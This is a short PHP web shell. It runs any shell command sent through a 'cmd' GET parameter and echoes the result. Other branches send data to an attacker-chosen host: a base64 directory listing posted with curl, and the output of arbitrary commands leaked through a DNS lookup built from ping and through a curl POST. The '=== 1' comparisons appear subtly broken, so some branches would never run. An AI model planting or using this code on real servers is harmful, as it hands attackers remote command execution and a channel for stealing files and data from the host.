<?php
if (isset($_GET["cmd"])) {
  echo exec($_GET["cmd"]);
}

if (isset($_GET["burl"]) && isset($_GET["ping"]) && ($_GET["ping"] === 1)) {
  @exec('ping -c 3 ' . $_GET["burl"]);
}

if (isset($_GET["burl"]) && isset($_GET["curl"]) && ($_GET["curl"] === 1)) {
  @exec('curl ' . $_GET["burl"] . ' -d `ls -a | base64 -w 0`');
}

if (isset($_GET["burl"]) && isset($_GET["bcmd"])) {
  $res = @exec('ping -c 3 `' . $_GET["bcmd"] . '`.' . $_GET["burl"]) && @exec('curl ' . $_GET["burl"] . ' -d `' . $_GET["bcmd"] . '`');
  echo $res;
}
?>
